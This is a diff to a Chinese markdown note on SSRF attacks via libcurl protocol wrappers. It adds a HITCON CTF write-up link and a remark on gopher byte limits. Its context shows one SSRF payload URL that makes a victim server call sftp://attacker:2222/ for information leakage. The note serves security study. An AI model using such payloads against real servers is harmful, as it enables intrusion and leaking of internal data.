@@ -6,6 +6,8 @@
 
 [SSRF libcurl protocol wrappers利用分析][1]
 
+[HITCON CTF 2015 Quals Web 出題心得 0x04 400 lalala (2 隊解)][2]
+
 ## docker run 
 
 ```
@@ -53,6 +55,12 @@ pop3s rtmp rtsp scp sftp smb
 smbs smtp smtps telnet tftp  
 ```
 
+注：
+
+libcurl 中的 gopher 只能接受 0x00 - 0xff
+
+
+
 ## 信息泄漏
 
 * dict 
@@ -80,3 +88,4 @@ http://victim:8084/ssrf_curl.php?url=sftp://attacker:2222/
 参见 [SSRF libcurl protocol wrappers利用分析]
 
 [1]: http://drops.wooyun.org/papers/13948
+[2]: http://drops.wooyun.org/web/9845
